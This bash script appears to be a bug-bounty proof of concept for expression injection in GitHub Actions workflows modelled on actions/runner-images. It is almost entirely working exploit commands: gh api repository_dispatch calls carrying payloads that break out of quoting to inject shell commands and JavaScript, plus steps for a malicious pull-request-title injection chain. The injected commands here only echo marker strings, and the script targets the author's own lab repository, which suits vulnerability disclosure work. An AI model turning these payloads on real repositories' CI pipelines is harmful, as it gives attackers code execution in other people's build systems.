#!/bin/bash
# PoC Trigger Scripts for actions/runner-images Expression Injection
# Run these AFTER pushing the workflow files to GitHub
# These demonstrate the vulnerability on YOUR OWN REPO only

REPO="Buggy0Bug/copilot-rce-lab"

echo "============================================"
echo "PoC 1: Shell Injection via repository_dispatch"
echo "============================================"
echo ""
echo "Payload mirrors: git checkout \${{ github.event.client_payload.branch_name }}"
echo "In runner-images, this is ReleaseBranchName in create_pull_request.yml"
echo ""
echo "Command:"
echo '  gh api repos/'$REPO'/dispatches \
    -f event_type=poc-shell-injection \
    -f '"'"'client_payload={"branch_name":"main\"; echo \"SHELL_INJECTION_EXECUTED\"; #","version":"1.0"}'"'"
echo ""
read -p "Run this PoC? (y/n): " confirm
if [ "$confirm" = "y" ]; then
    gh api repos/$REPO/dispatches \
        -f event_type=poc-shell-injection \
        -f 'client_payload={"branch_name":"main\"; echo \"SHELL_INJECTION_EXECUTED\"; #","version":"1.0"}'
    echo "Dispatched! Check Actions tab in ~30 seconds."
    echo "Look for 'SHELL_INJECTION_EXECUTED' in the workflow run logs."
fi

echo ""
echo "============================================"
echo "PoC 2: JS Injection (double-quote breakout)"
echo "============================================"
echo ""
echo "Payload mirrors: title: \"\${{ github.event.client_payload.PullRequestTitle }}\""
echo "In runner-images, this is PullRequestTitle in create_pull_request.yml"
echo ""
echo "Command:"
echo '  gh api repos/'$REPO'/dispatches \
    -f event_type=poc-js-injection \
    -f '"'"'client_payload={"pr_title":"\", console.log(\"JS_INJECTION_EXECUTED\"), \"","pr_body":"normal body","prerelease":"true"}'"'"
echo ""
read -p "Run this PoC? (y/n): " confirm
if [ "$confirm" = "y" ]; then
    gh api repos/$REPO/dispatches \
        -f event_type=poc-js-injection \
        -f 'client_payload={"pr_title":"\", console.log(\"JS_INJECTION_EXECUTED\"), \"","pr_body":"normal body","prerelease":"true"}'
    echo "Dispatched! Check Actions tab for 'JS_INJECTION_EXECUTED' in logs."
fi

echo ""
echo "============================================"
echo "PoC 3: JS Injection (unquoted prerelease)"
echo "============================================"
echo ""
echo "Payload mirrors: prerelease: \${{ github.event.client_payload.Prerelease }}"
echo "In runner-images, this is Prerelease in update_github_release.yml"
echo ""
echo "Command:"
echo '  gh api repos/'$REPO'/dispatches \
    -f event_type=poc-js-injection \
    -f '"'"'client_payload={"pr_title":"normal","pr_body":"normal","prerelease":"true}); console.log(\"UNQUOTED_JS_INJECTION\"); ({a: true"}'"'"
echo ""
read -p "Run this PoC? (y/n): " confirm
if [ "$confirm" = "y" ]; then
    gh api repos/$REPO/dispatches \
        -f event_type=poc-js-injection \
        -f 'client_payload={"pr_title":"normal","pr_body":"normal","prerelease":"true}); console.log(\"UNQUOTED_JS_INJECTION\"); ({a: true"}'
    echo "Dispatched! Check Actions tab for 'UNQUOTED_JS_INJECTION' in logs."
fi

echo ""
echo "============================================"
echo "PoC 4: PR Title Chain"
echo "============================================"
echo ""
echo "This mirrors the pull_request_target → dispatch chain."
echo "Steps:"
echo "  1. Create a PR with malicious title"
echo "  2. Add the 'run-ci' label"
echo "  3. Workflow dispatches PR title to poc-shell-injection workflow"
echo "  4. Shell injection executes"
echo ""
echo "Manual steps:"
echo "  1. Fork your own repo or create branch with changes"
echo '  2. gh pr create --title '"'"'"; echo CHAIN_INJECTION_EXECUTED; #'"'"' --body "PoC for PR title chain"'
echo '  3. gh pr edit <PR_NUMBER> --add-label "run-ci"'
echo "  4. Watch Actions tab for both workflows to fire"
echo ""

echo "============================================"
echo "Done. Screenshot each workflow run showing injected output."
echo "Save screenshots to ~/bug-bounty/targets/GitHub/poc/runner-images/"
echo "============================================"
